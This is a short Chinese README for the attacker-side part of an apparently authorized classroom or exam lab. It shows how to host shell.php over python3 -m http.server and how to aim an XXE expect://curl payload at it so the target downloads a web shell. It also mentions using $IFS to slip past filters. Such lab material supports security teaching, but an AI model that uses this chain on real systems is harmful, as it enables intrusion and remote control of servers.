# 攻击机 / 考试机演示（HTTP 下载）

用于配合 `expect://curl ...` 场景：在**你控制的机器**上托管一个极小的 PHP 文件，验证「目标通过 XXE 触发命令 → curl 拉取文件」的链路。

## 启动 HTTP 服务

在本目录执行（端口可按需修改）：

```bash
cd attacker-demo
python3 -m http.server 9999
```

浏览器可访问：`http://<你的考试机IP>:9999/shell.php` 确认能下载。

## 与靶场 XML 的对应关系

将 XML 中 `expect://` 里的地址替换为：

- `http://<考试机IP>:9999/shell.php`

**说明**：部分示例使用 `$IFS` 代替空格，以规避简单过滤；`curl -O` 将文件保存到 **PHP 进程当前工作目录**（因环境而异，课堂重点在「链路成立」而非落点路径）。

## 声明

仅用于**授权**的课堂/考试靶场演示。
